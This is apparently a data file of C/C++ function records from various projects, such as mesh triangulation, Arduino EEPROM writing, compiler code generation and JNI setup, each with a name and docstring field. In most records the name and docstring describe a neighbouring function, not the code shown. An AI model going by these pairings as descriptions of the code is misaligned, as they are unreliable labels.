{"content":"{'function_name': 'TriangulateTasksParallel', 'docstring': '\/\/ wait for triangulation to finish', 'code': 'inline bool Triangulate(Result& result)\\n{\\n    auto mesh_tasks = std::vector<TriangulateTask>();\\n    auto tasks      = std::vector<TriangulateTask>();\\n    auto meshes     = std::vector<Mesh>(result.shapes.size());\\n\\n    tasks.reserve(result.shapes.size());\\n\\n    for (size_t i = 0; i != result.shapes.size(); ++i) {\\n        const auto& mesh = result.shapes[i].mesh;\\n\\n        mesh_tasks.clear();\\n\\n        auto cost = size_t{ 0 };\\n\\n        auto isrc_begin = size_t{ 0 };\\n        auto isrc_end   = size_t{ 0 };\\n        auto idst_begin = size_t{ 0 };\\n        auto idst_end   = size_t{ 0 };\\n\\n        auto fsrc_begin = size_t{ 0 };\\n        auto fsrc_end   = size_t{ 0 };\\n        auto fdst_begin = size_t{ 0 };\\n        auto fdst_end   = size_t{ 0 };\\n\\n        auto triangle_sum = size_t{ 0 };\\n\\n        for (auto num_vertices : mesh.num_face_vertices) {\\n            auto num_triangles = static_cast<size_t>(num_vertices - 2);\\n\\n            triangle_sum += num_triangles;\\n\\n            if (num_vertices == 3) {\\n                cost += kTriangulateTriangleCost;\\n            } else if (num_vertices == 4) {\\n                cost += kTriangulateQuadCost;\\n            } else {\\n                auto n = static_cast<size_t>(num_vertices);\\n                cost += kTriangulatePerIndexCost * n * n;\\n            }\\n            if (cost >= kTriangulateSubdivideCost) {\\n                auto size = fsrc_end - fsrc_begin;\\n                mesh_tasks.emplace_back(&mesh, nullptr, cost, isrc_begin, idst_begin, fsrc_begin, fdst_begin, size);\\n\\n                isrc_begin = isrc_end;\\n                idst_begin = idst_end;\\n                fsrc_begin = fsrc_end;\\n                fdst_begin = fdst_end;\\n\\n                cost = 0;\\n            }\\n\\n            isrc_end += num_vertices;\\n            idst_end += 3 * num_triangles;\\n            fsrc_end += 1;\\n            fdst_end += num_triangles;\\n        }\\n\\n        if (triangle_sum == mesh.num_face_vertices.size()) {\\n            continue;\\n        }\\n\\n        if (auto size = fsrc_end - fsrc_begin; size > 0) {\\n            mesh_tasks.emplace_back(&mesh, nullptr, cost, isrc_begin, idst_begin, fsrc_begin, fdst_begin, size);\\n        }\\n\\n        meshes[i].indices             = Array<Index>(3 * triangle_sum);\\n        meshes[i].num_face_vertices   = Array<uint8_t>(triangle_sum);\\n        meshes[i].material_ids        = Array<int32_t>(triangle_sum);\\n        meshes[i].smoothing_group_ids = Array<uint32_t>(triangle_sum);\\n\\n        for (auto& task : mesh_tasks) {\\n            task.dst = &meshes[i];\\n        }\\n\\n        tasks.insert(tasks.end(), mesh_tasks.begin(), mesh_tasks.end());\\n    }\\n\\n    \/\/ already triangulated\\n    if (tasks.empty()) {\\n        return true;\\n    }\\n\\n    auto hardware_threads = static_cast<size_t>(std::thread::hardware_concurrency());\\n    auto concurrency      = std::min(hardware_threads, tasks.size());\\n    bool success          = true;\\n\\n    if (concurrency > 1) {\\n        success = TriangulateTasksParallel(concurrency, result.attributes.positions, tasks);\\n    } else {\\n        success = TriangulateTasksSequential(result.attributes.positions, tasks);\\n    }\\n\\n    if (!success) {\\n        result.error = Error{ make_error_code(rapidobj_errc::TriangulationError), {}, {} };\\n    }\\n\\n    auto old_meshes = std::vector<Mesh>();\\n    old_meshes.reserve(result.shapes.size());\\n\\n    for (size_t i = 0; i != result.shapes.size(); ++i) {\\n        if (!meshes[i].indices.empty()) {\\n            old_meshes.push_back(std::move(result.shapes[i].mesh));\\n            result.shapes[i].mesh = std::move(meshes[i]);\\n        }\\n    }\\n\\n    auto memory = size_t{ 0 };\\n\\n    for (const auto& old_mesh : old_meshes) {\\n        memory += SizeInBytes(old_mesh);\\n    }\\n\\n    \/\/ Free memory in a different thread\\n    if (memory > kMemoryRecyclingSize) {\\n        auto recycle = std::thread([](std::vector<Mesh>&&) {}, std::move(old_meshes));\\n        recycle.detach();\\n    }\\n\\n    return success;\\n}'}","id":3156}
{"content":"{'function_name': 'initWiFiAPMode', 'docstring': '\/\/ Make sure regardless of what happens we send the portal', 'code': 'void writeSSIDToEEPROM(char ssid[], char psk[], int sizeof_ssid, int sizeof_psk)\\n{\\n  int b1 = sizeof_ssid;\\n  int b2 = sizeof_psk;\\n  int totalBytes = b1 + b2 + 3;\\n\\n  Serial.print(\"sizeof(ssid) = \");\\n  Serial.println(b1);\\n  Serial.print(\"sizeof(psk) = \");\\n  Serial.println(b2);\\n  Serial.print(\"totalBytes = \");\\n  Serial.println(totalBytes);\\n\\n  if (totalBytes >= 512) return;\\n\\n  EEPROM.begin(512);\\n  \/\/Clear EEPROM before Writing\\n  Serial.println(\"Clearing EEPROM now...\");\\n  for (int i = 0; i < 512; i++)\\n  {\\n    EEPROM.write(i, 0xFF);\\n  }\\n  Serial.println(\"EEPROM clear!\");\\n\\n  Serial.print(\"Writing \");\\n  Serial.print(ssid);\\n  Serial.print(\" \/ \");\\n  Serial.print(psk);\\n  Serial.println(\" to EEPROM\");\\n\\n  int eeprom_i = 0;\\n\\n  EEPROM.write(eeprom_i, b1);\\n  eeprom_i += 1;\\n\\n  for (int i = 0; i < b1; i++)\\n  {\\n    EEPROM.write(eeprom_i, ssid[i]);\\n    eeprom_i += 1;\\n  }\\n\\n  EEPROM.write(eeprom_i, b2);\\n  eeprom_i += 1;\\n\\n  for (int i = 0; i < b2; i++)\\n  {\\n    EEPROM.write(eeprom_i, psk[i]);\\n    eeprom_i += 1;\\n  }\\n\\n  EEPROM.end();\\n\\n  Serial.println(\"Finished writing to EEPROM!\");\\n  Serial.print(\"EEPROM End Index: \");\\n  Serial.println(eeprom_i);\\n\\n}'}","id":3162}
{"content":"{'function_name': 'Str_Split', 'docstring': '\/\/\u8fd4\u56de\u503c\u4e2a\u6570', 'code': 'int Str_ScanFolder(lua_State* ls)\\n{\\n\\tconst char* szPath = NULL;\\n\\tif (lua_isstring(ls,1)){\\n\\t\\tszPath = lua_tostring(ls,1);\\n\\t}\\n\\tvector<FileInfoStruct*> vecOut;\\n\\tCKpFindFile::ScanFolder(szPath,vecOut);\\n\\t\/\/\u8fd4\u56demap\\n\\tlua_newtable(ls);\\n\\tfor (int i=0;i<vecOut.size();i++){\\n\\t\\tlua_pushfstring(ls,\"%s\",vecOut[i]->sFileName.c_str());\/\/map  value \u503c\\n\\t\\tlua_setfield(ls,-2,vecOut[i]->sFullPath.c_str());\/\/map Key \u952e\\n\\t}\\n\\treturn 1;\\n}'}","id":3163}
{"content":"{'function_name': 'setFlag', 'docstring': '\/\/ Not reachable', 'code': \"AssignCond boolExp( Seq<Instr>* seq\\n                  , BExpr* bexpr\\n                  , Var v\\n                  , bool modify\\n                  )\\n{\\n  BExpr b = *bexpr;\\n\\n  AssignCond always;\\n  always.tag = ALWAYS;\\n\\n  \/\/ -------------------------------\\n  \/\/ Case: x > y, replace with y < x\\n  \/\/ -------------------------------\\n  if (b.tag == CMP && b.cmp.op.op == GT) {\\n    Expr* e     = b.cmp.lhs;\\n    b.cmp.lhs   = b.cmp.rhs;\\n    b.cmp.rhs   = e;\\n    b.cmp.op.op = LT;\\n  }\\n\\n  \/\/ ---------------------------------\\n  \/\/ Case: x <= y, replace with y >= x\\n  \/\/ ---------------------------------\\n  if (b.tag == CMP && b.cmp.op.op == LE) {\\n    Expr* e     = b.cmp.lhs;\\n    b.cmp.lhs   = b.cmp.rhs;\\n    b.cmp.rhs   = e;\\n    b.cmp.op.op = GE;\\n  }\\n\\n  \/\/ -----------------------------------\\n  \/\/ Case: x op y, where x is not simple\\n  \/\/ -----------------------------------\\n  if (b.tag == CMP && !isSimple(b.cmp.lhs)) {\\n    b.cmp.lhs = simplify(seq, b.cmp.lhs);\\n  }\\n\\n  \/\/ -----------------------------------\\n  \/\/ Case: x op y, where y is not simple\\n  \/\/ -----------------------------------\\n  if (b.tag == CMP && !isSimple(b.cmp.rhs)) {\\n    b.cmp.rhs = simplify(seq, b.cmp.rhs);\\n  }\\n\\n  \/\/ ---------------------------------------------\\n  \/\/ Case: x op y, where x and y are both literals\\n  \/\/ ---------------------------------------------\\n  if (b.tag == CMP && isLit(b.cmp.lhs) && isLit(b.cmp.rhs)) {\\n    Var tmpVar = freshVar();\\n    varAssign(seq, always, tmpVar, b.cmp.lhs);\\n    b.cmp.lhs = mkVar(tmpVar);\\n  }\\n\\n  \/\/ --------------------------------------\\n  \/\/ Case: x op y, where x and y are simple\\n  \/\/ --------------------------------------\\n  if (b.tag == CMP) {\\n    \/\/ Compute condition flag\\n    AssignCond cond;\\n    cond.tag = FLAG;\\n    switch(b.cmp.op.op) {\\n      case EQ:  cond.flag = ZS; break;\\n      case NEQ: cond.flag = ZC; break;\\n      case LT:  cond.flag = NS; break;\\n      case GE:  cond.flag = NC; break;\\n      default:  assert(false);\\n    }\\n\\n    \/\/ Implement comparison using subtraction instruction\\n    Op op;\\n    op.type = b.cmp.op.type;\\n    op.op   = SUB;\\n    Instr instr;\\n    instr.tag          = ALU;\\n    instr.ALU.setFlags = true;\\n    instr.ALU.cond     = always;\\n    instr.ALU.dest     = dstReg(v);\\n    instr.ALU.srcA     = operand(b.cmp.lhs);\\n    instr.ALU.op       = opcode(op);\\n    instr.ALU.srcB     = operand(b.cmp.rhs);\\n    seq->append(instr);\\n\\n    return cond;\\n  }\\n\\n  \/\/ -----------------------------------------\\n  \/\/ Case: !b, where b is a boolean expression\\n  \/\/ -----------------------------------------\\n  if (b.tag == NOT) {\\n    AssignCond cond = boolExp(seq, b.neg, v, modify);\\n    return negAssignCond(cond);\\n  }\\n\\n  \/\/ ------------------------------------------------\\n  \/\/ Case: a || b, where a, b are boolean expressions\\n  \/\/ ------------------------------------------------\\n  if (b.tag == OR) {\\n    Var w = freshVar();\\n    AssignCond condA = boolExp(seq, b.disj.lhs, v, false);\\n    AssignCond condB = boolExp(seq, b.disj.rhs, w, true);\\n    return boolOr(seq, condA, v, condB, true);\\n  }\\n\\n  \/\/ ------------------------------------------------\\n  \/\/ Case: a && b, where a, b are boolean expressions\\n  \/\/ ------------------------------------------------\\n  if (b.tag == AND) {\\n    \/\/ Use De Morgan's law\\n    BExpr* demorgan = mkNot(mkOr(mkNot(b.conj.lhs), mkNot(b.conj.rhs)));\\n    return boolExp(seq, demorgan, v, modify);\\n  }\\n\\n  \/\/ Not reachable\\n  assert(false);\\n}\"}","id":3169}
{"content":"{'function_name': 'formatBytes', 'docstring': '\/\/ convert sizes in bytes to KB and MB', 'code': 'String getContentType(String filename) { \/\/ determine the filetype of a given filename, based on the extension\\n  if (filename.endsWith(\".html\")) return \"text\/html\";\\n  else if (filename.endsWith(\".css\")) return \"text\/css\";\\n  else if (filename.endsWith(\".js\")) return \"application\/javascript\";\\n  else if (filename.endsWith(\".ico\")) return \"image\/x-icon\";\\n  else if (filename.endsWith(\".gz\")) return \"application\/x-gzip\";\\n  return \"text\/plain\";\\n}'}","id":3170}
{"content":"{'function_name': 'gps_align', 'docstring': '\/\/ This is used to align GPS return values ', 'code': \"void comma(char num) {   \\n  char val;\\n  char count = 0; \/\/ count the number of ','\\n \\n  while(1) {\\n    if (Serial.available()) {\\n      val = Serial.read();\\n      if(val == ',') count++;\\n    }\\n    if (count == num) return;\\n  }\\n}\"}","id":3172}
{"content":"{'function_name': 'demosaicb_rd6_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> demosaicb_rd7_select(denoise_cache& denoise, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaicb_rd7 read pattern: { demosaicb_update_0[d0, d1] -> denoise[1 + 2d0, d1] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Read schedule : { demosaicb_update_0[d0, d1] -> [3 + d1, 2 + d0, 4] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Write schedule: { denoise_update_0[d0, d1] -> [2 + d1, 1 + d0, 3] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ DD fold: { demosaicb_update_0[d0, d1] -> 964 : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  auto value_denoise_denoise_update_0_write1 = denoise.denoise_denoise_update_0_write1_merged_banks_9.peek_964();\\n  return value_denoise_denoise_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":3176}
{"content":"{'function_name': 'openfilehtm28', 'docstring': '\/\/', 'code': 'bool save28() {\\n  DynamicJsonBuffer  jsonBuffer;\\n  JsonObject& json = jsonBuffer.createObject();\\n  json[\"d1\"] = on_off_thingspeak;\/\/\\n  json[\"d2\"] = api_key_thingspeak;\/\/\\n  json[\"d3\"] = interval_time_thingspeak;\/\/ \\n  json[\"d4\"] = on_off_narodmon;\/\/ \\n  json[\"d5\"] = interval_time_narodmon;\/\/\\n   \\n  json[\"d6\"] = on_off_your_server;\/\/ \\n  json[\"d7\"] = interval_time_your_server;\/\/\\n  json[\"d8\"] = host_your_server;\/\/  \\n  json[\"d9\"] = port_your_server;\/\/ \\n  json[\"d10\"] = url_your_server;\/\/ \\n  File configFile = SPIFFS.open(\"\/htm28.json\", \"w\");\\n  if (!configFile) {   \\n    return false;\\n  }\\n  json.printTo(configFile);\\n  return true;\\n}'}","id":3177}
{"content":"{'function_name': 'nu_matches_chi2_b', 'docstring': '\/\/direct form: chi2 = sum{1..k} ((Ys - nPs) ^ 2 \/ nPs)', 'code': 'float nu_all_chi2_b (char* xseq, char* yseq, BATCH* b_ptr, int b_cnt)\\n{\\n    int i, j, len;\\n    int xn[4], yn[4];\\n    int evt[4][4];\\n    float exp[4][4];\\n    float diff, chi2;\\n\\n    \/\/reset nucleotide composition and event count\\n    for (i = 0; i < 4; i++)\\n    {\\n        xn[i] = 0, yn[i] = 0;\\n        for (j = 0; j < 4; j++)\\n            evt[i][j] = 0;\\n    }\\n\\n    \/\/calculate nucleotide composition and match count\\n    for (len = 0; b_cnt > 0; b_cnt--, len += b_ptr->len, b_ptr++)\\n        for (i = 0; i < b_ptr->len; i++)\\n        {\\n            int xb = get_base(xseq, b_ptr->xpos + i);\\n            int yb = get_base(yseq, b_ptr->ypos + i);\\n            xn[xb]++, yn[yb]++, evt[xb][yb]++;\\n        }\\n\\n    if (len == 0) return 0.;\\n\\n    \/\/calculate expected event counts based on nucleotide composition\\n    for (i = 0; i < 4; i++)\\n        for (j = 0; j < 4; j++)\\n            exp[i][j] = ((float) xn[i] * yn[j]) \/ len;\\n\\n    \/\/calculate chi^2\\n    \/\/direct form: chi2 = sum{1..k} ((Ys - nPs) ^ 2 \/ nPs)\\n    for (i = 0, chi2 = 0.; i < 4; i++)\\n        for (j = 0; j < 4; j++)\\n            if (exp[i][j] > 0.)\\n            {\\n                diff = exp[i][j] - evt[i][j];\\n                chi2 += diff * diff \/ exp[i][j];\\n            }\\n\\n    return chi2;\\n}'}","id":3178}
{"content":"{'function_name': 'boolExp', 'docstring': '\/\/ Not reachable', 'code': 'BranchCond condExp(Seq<Instr>* seq, CExpr* c)\\n{\\n  Var v = freshVar();\\n  AssignCond cond = boolExp(seq, c->bexpr, v, true);\\n\\n  BranchCond bcond;\\n  if (cond.tag == ALWAYS) { bcond.tag = COND_ALWAYS; return bcond; }\\n  if (cond.tag == NEVER) { bcond.tag = COND_NEVER; return bcond; }\\n\\n  assert(cond.tag == FLAG);\\n\\n  bcond.flag = cond.flag;\\n  if (c->tag == ANY) {\\n    bcond.tag = COND_ANY;\\n    return bcond;\\n  }\\n  else if (c->tag == ALL) {\\n    bcond.tag = COND_ALL;\\n    return bcond;\\n  }\\n\\n  \/\/ Not reachable\\n  assert(false);\\n}'}","id":3185}
{"content":"{'function_name': 'JNI_OnLoad', 'docstring': '\/\/ Cache the JavaVM interface pointer\\r', 'code': 'void Java_com_apress_threads_MainActivity_nativeInit (\\r\\n\\t\\tJNIEnv* env,\\r\\n\\t\\tjobject obj)\\r\\n{\\r\\n\\t\/\/ Initialize mutex\\r\\n\\tif (0 != pthread_mutex_init(&mutex, NULL))\\r\\n\\t{\\r\\n\\t\\t\/\/ Get the exception class\\r\\n\\t\\tjclass exceptionClazz = env->FindClass(\\r\\n\\t\\t\\t\\t\"java\/lang\/RuntimeException\");\\r\\n\\r\\n\\t\\t\/\/ Throw exception\\r\\n\\t\\tenv->ThrowNew(exceptionClazz, \"Unable to initialize mutex\");\\r\\n\\t\\tgoto exit;\\r\\n\\t}\\r\\n\\r\\n\\t\/\/ If object global reference is not set\\r\\n\\tif (NULL == gObj)\\r\\n\\t{\\r\\n\\t\\t\/\/ Create a new global reference for the object\\r\\n\\t\\tgObj = env->NewGlobalRef(obj);\\r\\n\\r\\n\\t\\tif (NULL == gObj)\\r\\n\\t\\t{\\r\\n\\t\\t\\tgoto exit;\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\r\\n\\t\/\/ If method ID is not cached\\r\\n\\tif (NULL == gOnNativeMessage)\\r\\n\\t{\\r\\n\\t\\t\/\/ Get the class from the object\\r\\n\\t\\tjclass clazz = env->GetObjectClass(obj);\\r\\n\\r\\n\\t\\t\/\/ Get the method id for the callback\\r\\n\\t\\tgOnNativeMessage = env->GetMethodID(clazz,\\r\\n\\t\\t\\t\\t\"onNativeMessage\",\\r\\n\\t\\t\\t\\t\"(Ljava\/lang\/String;)V\");\\r\\n\\r\\n\\t\\t\/\/ If method could not be found\\r\\n\\t\\tif (NULL == gOnNativeMessage)\\r\\n\\t\\t{\\r\\n\\t\\t\\t\/\/ Get the exception class\\r\\n\\t\\t\\tjclass exceptionClazz = env->FindClass(\\r\\n\\t\\t\\t\\t\\t\"java\/lang\/RuntimeException\");\\r\\n\\r\\n\\t\\t\\t\/\/ Throw exception\\r\\n\\t\\t\\tenv->ThrowNew(exceptionClazz, \"Unable to find method\");\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\r\\nexit:\\r\\n\\treturn;\\r\\n}'}","id":3191}
{"content":"{'function_name': 'ApplyTransformationMatrix', 'docstring': '\/* PAPYRUS:\\r\\n            _fEditingSnapPositionLocal[0] = _fEditingSnapTransformToLocal[0]*_fEditingSnapPosition[0] + _fEditingSnapTransformToLocal[1]*_fEditingSnapPosition[1] + _fEditingSnapTransformToLocal[2]*_fEditingSnapPosition[2]\\r\\n            _fEditingSnapPositionLocal[1] = _fEditingSnapTransformToLocal[3]*_fEditingSnapPosition[0] + _fEditingSnapTransformToLocal[4]*_fEditingSnapPosition[1] + _fEditingSnapTransformToLocal[5]*_fEditingSnapPosition[2]\\r\\n            _fEditingSnapPositionLocal[2] = _fEditingSnapTransformToLocal[6]*_fEditingSnapPosition[0] + _fEditingSnapTransformToLocal[7]*_fEditingSnapPosition[1] + _fEditingSnapTransformToLocal[8]*_fEditingSnapPosition[2]\\r\\n         *\/', 'code': 'VMResultArray<float> ApplySnappedOffsetToPosition(\\r\\n         VMClassRegistry* registry, UInt32 stackId, StaticFunctionTag*,\\r\\n         VMArray<float> afBasePosition,\\r\\n         VMArray<float> afSnapPosition,\\r\\n         VMArray<float> afPositionChange,\\r\\n         VMArray<float> matrix,\\r\\n         SInt32 snap\\r\\n      ) {\\r\\n         VMResultArray<float> result;\\r\\n         result.resize(3);\\r\\n         if (afBasePosition.Length() < 3) {\\r\\n            registry->LogError(\"afBasePosition must have three or more elements (extras will be ignored).\", stackId);\\r\\n            return result;\\r\\n         };\\r\\n         if (afSnapPosition.Length() < 3) {\\r\\n            registry->LogError(\"afSnapPosition must have three or more elements (extras will be ignored).\", stackId);\\r\\n            return result;\\r\\n         };\\r\\n         if (afPositionChange.Length() < 3) {\\r\\n            registry->LogError(\"afPositionChange must have three or more elements (extras will be ignored).\", stackId);\\r\\n            return result;\\r\\n         };\\r\\n         if (matrix.Length() < 9) {\\r\\n            registry->LogError(\"afMatrixTransformToLocal must have nine or more elements (extras will be ignored).\", stackId);\\r\\n            return result;\\r\\n         };\\r\\n         if (snap < 0)\\r\\n            snap = -snap;\\r\\n         \/\/\\r\\n         float frame[9];\\r\\n         float local[3];\\r\\n         float offsets[3];\\r\\n         for (UInt8 i = 0; i < 9;i++)\\r\\n            matrix.Get(&frame[i], i);\\r\\n         {  \/\/ Convert (base) to the reference frame established by (matrix).\\r\\n            float base[3];\\r\\n            for (UInt8 i = 0; i < 3; i++)\\r\\n               afBasePosition.Get(&base[i], i);\\r\\n            local[0] = (frame[0] * base[0]) + (frame[1] * base[1]) + (frame[2] * base[2]);\\r\\n            local[1] = (frame[3] * base[0]) + (frame[4] * base[1]) + (frame[5] * base[2]);\\r\\n            local[2] = (frame[6] * base[0]) + (frame[7] * base[1]) + (frame[8] * base[2]);\\r\\n         }\\r\\n         if (snap != 0) {  \/\/ Carry out initial computations.\\r\\n            for (UInt32 i = 0; i < 3; i++) {\\r\\n               {  \/\/ Get offsets.\\r\\n                  \/\/ Papyrus: fOffsets[0] = (_fEditingSnapPositionLocal[i] as int) % _iCurrentPositionSnap + (_fEditingSnapPositionLocal[i] - (_fEditingSnapPositionLocal[i] as int))\\r\\n                  float snapPosDec = 0;\\r\\n                  afSnapPosition.Get(&snapPosDec, i);\\r\\n                  offsets[i] = ((SInt32)snapPosDec % snap) + (snapPosDec - (SInt32)snapPosDec);\\r\\n               }\\r\\n               local[i] -= offsets[i];\\r\\n               {  \/\/ Snap.\\r\\n                  \/\/ Papyrus: vLocal[i] = Round(vLocal[i] \/ _iCurrentPositionSnap) * _iCurrentPositionSnap + (fPosition[i] * _iCurrentPositionSnap)\\r\\n                  float change = 0;\\r\\n                  afPositionChange.Get(&change, i);\\r\\n                  local[i] = (round(local[i] \/ snap) * snap) + (change * snap);\\r\\n               }\\r\\n               local[i] += offsets[i];\\r\\n            }\\r\\n         } else {\\r\\n            for (UInt32 i = 0; i < 3; i++) {\\r\\n               float change = 0;\\r\\n               afPositionChange.Get(&change, i);\\r\\n               local[i] += change;\\r\\n            }\\r\\n         }\\r\\n         {  \/\/ Convert back to the world reference frame.\\r\\n            result[0] = (frame[0] * local[0]) + (frame[3] * local[1]) + (frame[6] * local[2]);\\r\\n            result[1] = (frame[1] * local[0]) + (frame[4] * local[1]) + (frame[7] * local[2]);\\r\\n            result[2] = (frame[2] * local[0]) + (frame[5] * local[1]) + (frame[8] * local[2]);\\r\\n         }\\r\\n         return result;\\r\\n      }'}","id":3200}
{"content":"{'function_name': 'func_trace_init', 'docstring': \"\/\/ then the whole func_trace module doesn't have to do anything.\", 'code': 'void\\nfunc_trace_exit()\\n{\\n    if (dr_atomic_add32_return_sum(&func_trace_init_count, -1) != 0)\\n        return;\\n\\n    if (funcs_str.empty())\\n        return;\\n    \/* Clear for re-attach. *\/\\n    funcs_str.clear();\\n    funcs_str_sep.clear();\\n    hashtable_delete(&pc2idplus1);\\n    if (!drvector_delete(&funcs_wrapped) || !drvector_delete(&func_names))\\n        DR_ASSERT(false);\\n    dr_mutex_destroy(funcs_wrapped_lock);\\n    if (!drmgr_unregister_module_load_event(instru_funcs_module_load) ||\\n        !drmgr_unregister_module_unload_event(instru_funcs_module_unload) ||\\n        !drmgr_unregister_thread_init_event(event_thread_init) ||\\n        !drmgr_unregister_thread_exit_event(event_thread_exit))\\n        DR_ASSERT(false);\\n    if (!op_record_dynsym_only.get_value()) {\\n        if (drsym_exit() != DRSYM_SUCCESS)\\n            DR_ASSERT(false);\\n    }\\n    drwrap_exit();\\n}'}","id":3204}
{"content":"{'function_name': 'negativeShift', 'docstring': '\/\/ cxx17-warning {{shifting a negative signed value is undefined}} \\\\\\n                    \/\/ ref-cxx17-warning {{shifting a negative signed value is undefined}} \\\\\\n                    \/\/ cxx17-note {{left shift of negative value -1}} \\\\\\n                    \/\/ ref-cxx17-note {{left shift of negative value -1}}', 'code': 'constexpr int foo(int a) {\\n    return -a << 2; \/\/ cxx17-note {{left shift of negative value -10}} \\\\\\n                    \/\/ ref-cxx17-note {{left shift of negative value -10}} \\\\\\n                    \/\/ cxx17-note {{left shift of negative value -2}} \\\\\\n                    \/\/ ref-cxx17-note {{left shift of negative value -2}}\\n  }'}","id":3212}
{"content":"{'function_name': 'FindChessTypeReForDir', 'docstring': '\/\/\u68c0\u7d22\u53ef\u7528\u8bed\u8a00\u5305', 'code': 'BOOL GetChessTypeResourse()\\n{\\n\\tHANDLE hFile;\\n\\tWIN32_FIND_DATA fData;\\n\\tchar directory[MAX_PATH]={0};\\n\\tchar filename[MAX_PATH]={0};\\n\\tchar check[50];\\n\\tstrcpy(directory,gameSet.CurDir);\\n\\tstrcat(directory,\"\\\\\\\\ChessType\\\\\\\\*\");\\n\\t\/\/\u68c0\u7d22\u53ef\u7528\u8bed\u8a00\u5305\\n\\thFile=FindFirstFile(directory,&fData);\\n\\tif(hFile==INVALID_HANDLE_VALUE)\\n\\t{\\n\\t\\tErrorBox(\"Find first ChessType resourse failed!\");\\n\\t\\treturn FALSE;\\n\\t}\\n\\tchessNum=0;\\n\\tdo{\\n\\t\\tif(fData.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY)\/\/\u6587\u4ef6\u5939\\n\\t\\t{\\n\\t\\t\\tif(strcmp(fData.cFileName,\".\")==0 ||strcmp(fData.cFileName,\"..\")==0)\/\/\u4ee3\u8868\u672c\u7ea7\u76ee\u5f55\u7684\\'.\\'\u548c\u4e0a\u7ea7\u76ee\u5f55\u7684\\'..\\'\\n\\t\\t\\t\\tcontinue;\\n\\t\\t\\tstrcpy(directory, gameSet.CurDir);\\n\\t\\t\\tstrcat(directory, \"\\\\\\\\ChessType\\\\\\\\\");\\n\\t\\t\\tstrcat(directory, fData.cFileName);\\n\\t\\t\\tFindChessTypeReForDir(directory);\\n\\t\\t}\\n\\t}while(FindNextFile(hFile,&fData));\\n\\n\\tstrcpy(directory, gameSet.CurDir);\\n\\tstrcat(directory, \"\\\\\\\\ChessType\");\\n\\tFindChessTypeReForDir(directory);\\n\\n\\tif (chessNum == 0)\\n\\t{\\n\\t\\tErrorBox(\"Find first ChessType resourse failed!\");\\n\\t\\treturn FALSE;\\n\\t}\\n\\treturn TRUE;\\n}'}","id":3215}
{"content":"{'function_name': 'FilterDX11', 'docstring': '\/\/ allow trivial things', 'code': 'void FilterDX12(AGSDX12ReturnedParams::ExtensionsSupported &extensionsSupported)\\n{\\n  if(AMD_ags_AllowUnknownExtensions())\\n    return;\\n\\n  AGSDX12ReturnedParams::ExtensionsSupported ret = {};\\n\\n  \/\/ allow all intrinsics features\\n  ret.intrinsics16 = extensionsSupported.intrinsics16;\\n  ret.intrinsics17 = extensionsSupported.intrinsics17;\\n  ret.intrinsics19 = extensionsSupported.intrinsics19;\\n\\n  \/\/ allow custom UAV slots\\n  ret.UAVBindSlot = extensionsSupported.UAVBindSlot;\\n\\n  \/\/ allow trivial things\\n  ret.userMarkers = extensionsSupported.userMarkers;\\n  ret.appRegistration = extensionsSupported.appRegistration;\\n\\n  extensionsSupported = ret;\\n}'}","id":3217}
{"content":"{'function_name': 'TEST', 'docstring': '\/\/ nothing to see here, move along', 'code': 'TEST(action) {\\n  auto flag = false;\\n  \/\/ no args, void result type\\n  auto p0 = printers::integral<int> ->* [&] { flag = true; };\\n  std::string str;\\n  CHECK(p0(str, 42));\\n  CHECK(flag);\\n  CHECK_EQUAL(str, \"42\");\\n  \/\/ one arg, void result type\\n  auto p1 = printers::integral<int> ->* [&](int i) { flag = i % 2 == 0; };\\n  str.clear();\\n  CHECK(p1(str, 8));\\n  CHECK_EQUAL(str, \"8\");\\n  \/\/ no args, non-void result type\\n  auto p2 = printers::integral<int> ->* [] { return 42; };\\n  str.clear();\\n  CHECK(p2(str, 7));\\n  CHECK_EQUAL(str, \"42\");\\n  \/\/ one arg, non-void result type\\n  auto p3 = printers::integral<int> ->* [](int i) { return ++i; };\\n  str.clear();\\n  CHECK(p3(str, 41));\\n  CHECK_EQUAL(str, \"42\");\\n}'}","id":3218}
{"content":"{'function_name': 'Reset', 'docstring': '\/\/  reset all dynamic vars', 'code': 'gboolean            Parse()\\n{\\n    libgwr::Chrono  chrono;\\n    int             yyret   =   0;\\n\\n    yydebug                 =   0;\\n    \/\/  ........................................................................\\n    \/\/  stream\\n    g_return_val_if_fail( ! ga_stream,   FALSE );                               \/\/  ensure no stream is defined\\n\\n    \/\/ eventually create - erase current content\\n\\tga_stream = fopen(File_def(), \"r\");\\n\\n\\t\/\/ make sure it is valid:\\n\\tif ( ! ga_stream )\\n    {\\n        PARSING_ERR(\"Could not open file [%s]\\\\n\", File_def());\\n\\t\\treturn FALSE;\\n\\t}\\n\\n    \/\/  ........................................................................\\n\\t\/\/ set flex to read from it instead of defaulting to STDIN:\\n\\tyyin = ga_stream;\\n\\n    PARSING_INF(\"%s\", \"Parsing...\");\\n\\n    \/\/ go !\\n    yyparse();\\n\\n    parser::Set_themes_preformats();\\n    parser::Set_namespaces_prefix();\\n\\n    PARSING_INF(\"Parsing finished in  %i:%i\", chrono.es(), chrono.ems());\\n    \/\/PARSING_INF(\"  Lexer status :%s\", lexer::Status());\\n    \/\/PARSING_INF(\"  Parser status:%s\", parser::Status());\\n\\n    fclose(ga_stream);\\n    fflush(stdin);\\n\\n    Show_all();\\n\\n    \/\/  return the error indicator\\n    return ( yyret != 0 );\\n}'}","id":3225}
